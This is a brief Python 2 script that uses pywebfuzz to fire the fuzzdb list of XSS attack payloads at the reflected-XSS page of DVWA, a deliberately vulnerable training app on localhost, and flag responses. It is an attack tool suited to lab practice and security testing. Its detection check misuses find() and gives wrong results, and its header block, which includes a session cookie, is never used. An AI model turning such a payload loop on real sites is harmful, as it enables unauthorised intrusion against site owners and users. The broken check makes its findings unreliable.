from pywebfuzz import fuzzdb, utils

location = "http://127.0.0.1/DVWA-1.0.8/vulnerabilities/xss_r/?name="

request_headers = {"Host": "foo.com",
                   "User-Agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Firefox/3.6.3",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Accept-Language": "en-us,en;q=0.5",
                   "Keep-Alive": "115",
                   "Connection": "keep-alive",
                   "Referer": "http://foo.com",
                   "Cookie": "security=low; PHPSESSID=00885b45d9ddda3e757371b177c5959b"}

xss_attack_payloads = fuzzdb.attack_payloads.xss.xss_rsnake

for payload in xss_attack_payloads:
  complete_url = location + payload
  headers, content, code, time = utils.make_request(complete_url)
  if (content.find(payload)): print "The URL: ", complete_url, "might cause an XSS attack."

